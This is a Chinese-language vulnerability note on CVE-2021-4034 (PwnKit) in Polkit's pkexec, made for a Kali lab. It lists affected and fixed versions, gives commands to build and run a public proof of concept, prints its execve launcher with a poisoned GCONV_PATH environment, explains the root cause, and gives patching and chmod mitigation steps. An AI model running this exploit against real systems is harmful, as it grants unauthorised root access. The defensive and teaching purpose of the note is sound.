# CVE-2021-4034

## Products Affected By CVE-2021-4034
2009年5月至今发布的所有 Polkit 版本
注：Polkit预装在CentOS、Ubuntu、Debian、Redhat、Fedora、Gentoo、Mageia等多个Linux发行版上，所有存在Polkit的Linux系统均受影响。

## Unaffected version
CentOS：
CentOS 6：polkit-0.96-11.el6_10.2
CentOS 7：polkit-0.112-26.el7_9.1
CentOS 8.0：polkit-0.115-13.el8_5.1
CentOS 8.2：polkit-0.115-11.el8_2.2
CentOS 8.4：polkit-0.115-11.el8_4.2

Ubuntu：
Ubuntu 14.04 ESM：policykit-1-0.105-4ubuntu3.14.04.6+esm1
Ubuntu 16.04 ESM：policykit-1-0.105-14.1ubuntu0.5+esm1
Ubuntu 18.04 LTS：policykit-1-0.105-20ubuntu0.18.04.6
Ubuntu 20.04 LTS：policykit-1-0.105-26ubuntu1.2
Ubuntu 21.10：policykit-1-0.105-31ubuntu0.1

Debain：
Debain stretch：policykit-1 0.105-18+deb9u2
Debain buster：policykit-1 0.105-25+deb10u1
Debain bullseye：policykit-1 0.105-31+deb11u1
Debain bookworm,bullseye：policykit-1 0.105-31.1

## Experiment Environment

Kali-Linux-2021.3

## INSTALL & Configuration

```
在https://github.com/berdav/CVE-2021-4034下载PoC文件压缩包
```


## How to trigger vulnerability

```
unzip CVE-2021-4034-main.zip
cd CVE-2021-4034-main
make
./cve-2021-4034
```

## PoCs

```
#include <unistd.h>

int main(int argc, char **argv)
{
	char * const args[] = {
		NULL
	};
	char * const environ[] = {
		"pwnkit.so:.",
		"PATH=GCONV_PATH=.",
		"SHELL=/lol/i/do/not/exists",
		"CHARSET=PWNKIT",
		"GIO_USE_VFS=",
		NULL
	};
	return execve("/usr/bin/pkexec", args, environ);
}
```


### Root Cause

该漏洞是由于pkexec在处理传入参数的逻辑出现问题，导致环境变量被污染，最终交由pkexec代码逻辑执行实现客户机权限提升。

pkexec为suid程序
当argc（命令行参数个数变量）为0时，pkexec会读取argv[1]变量，而由于Linux进程的内存布局中环境变量是紧接着命令行参数的，因此实际上会读取到第一个环境变量。
读取到argv[1]之后，若其不是以/开头的（即不是绝对路径），则pkexec会将其理解为相对路径，继而会在环境变量中查找PATH变量，将其转换为实际路径。
若PATH环境变量包含一个攻击者可控的路径，则pkexec转换后的实际路径将会是这个攻击者可控的路径下的一个子目录，则显然此实际路径也是攻击者可控的。
pkexec会对argv[1]赋值，将其修改为上述得到的实际路径，但是我们知道argv[1]此时实际上指向的是pkexec的第一个环境变量，也就是说，pkexec将自己的第一个环境变量修改为这个实际路径了。

pkexec会在程序运行过程中调用g_printerr函数，这个函数会在运行的时候按需载入GCONV_PATH环境变量指向的路径下的gconv-modules文件中写明的外部动态链接库（so），并运行其中的初始化函数gconv_init。

## Suggestions
目前各Linux发行版官方均已给出安全补丁，建议用户尽快升级至安全版本，或参照官方说明措施进行缓解，CentOS、Ubuntu及Debian用户可参考以下链接进行升级：
https://ubuntu.com/security/CVE-2021-4034
https://access.redhat.com/security/cve/CVE-2021-4034
https://security-tracker.debian.org/tracker/CVE-2021-4034

CentOS、Ubuntu的用户可以使用以下命令升级Polkit到最新版本：
CentOS系列：
yum clean all && yum makecache
yum update polkit -y
验证修复，可通过以下命令查看 Polkit 是否为安全版本：
rpm -qa polkit

Ubuntu系列：
sudo apt-get update
sudo apt-get install policykit-1
验证修复，可通过以下命令查看 Polkit 是否为安全版本：
dpkg -l policykit-1

临时修复建议：

1. 如果系统没有可用的补丁，可以从 pkexec 中删除 SUID 位作为临时缓解措施，输入以下命令：
chmod 0755 /usr/bin/pkexec
2. 如非必要，建议临时删除 pkexec 可执行程序。

## References
[CVE-2021-4034](https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2021-4034)
[CVE-2021-4034漏洞利用原理分析](https://baijiahao.baidu.com/s?id=1724340495908640232&wfr=spider&for=pc)
[CVE-2021-4034 Linux Polkit本地权限提升漏洞](https://www.jianshu.com/p/ff42a6f715e8)

